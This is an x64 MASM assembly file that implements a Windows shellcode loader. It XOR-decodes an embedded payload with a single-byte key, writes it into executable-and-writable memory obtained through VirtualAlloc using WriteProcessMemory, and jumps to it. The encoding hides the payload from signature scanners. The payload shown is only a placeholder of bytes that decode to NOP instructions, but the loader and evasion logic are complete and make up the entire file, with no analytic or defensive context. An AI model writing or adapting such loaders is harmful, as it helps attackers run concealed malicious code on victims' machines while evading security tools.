; windows_obfuscation_encoder_virtualalloc.asm

extrn ExitProcess :PROC
extrn VirtualAlloc :PROC
extrn GetCurrentProcess :PROC
extrn WriteProcessMemory :PROC
extrn GetLastError :PROC

.data
    key             DB 42h
    sizePayload     DQ ?
    baseAddress     DQ ?
    currentHandle   DQ ?
    byteWritten     DQ ?
    byteDecoded     DB ?

.code

Start PROC
    SUB     rsp, 28h

    LEA     rsi, _startPayload
    LEA     rdi, _endPayload
    SUB     rdi, rsi
    MOV     sizePayload, rdi

_VirtualAlloc_Code:
    XOR     rcx, rcx
    MOV     rdx, sizePayload
    MOV     r8, 1000h
    MOV     r9, 40h
    CALL    VirtualAlloc 
    MOV     baseAddress, rax
    MOV     rdi, baseAddress

_GetCurrentProcess:
    CALL    GetCurrentProcess
    MOV     currentHandle, rax

    XOR     r11, r11

_startEnc:
    MOV     al, byte ptr [rsi+r11]
    XOR     al, key
    MOV     byteDecoded, al

    PUSH    r11
    MOV     rcx, currentHandle
    LEA     rdx, [rdi+r11]
    LEA     r8, byteDecoded
    MOV     r9, 1
    SUB     rsp, 28h
    XOR     rax, rax
    MOV     [rsp+20h], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    POP     r11 

_nextEnc:
    INC     r11
    CMP     r11, sizePayload
    JGE     _endEnc
    JMP     _startEnc
_endEnc:
    JMP     baseAddress

_startPayload:
    DQ 0D2D2D2D2D2D2D2D2h
    DQ 0D2D2D2D2D2D2D2D2h
_endPayload:

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess 
    RET
Start ENDP
END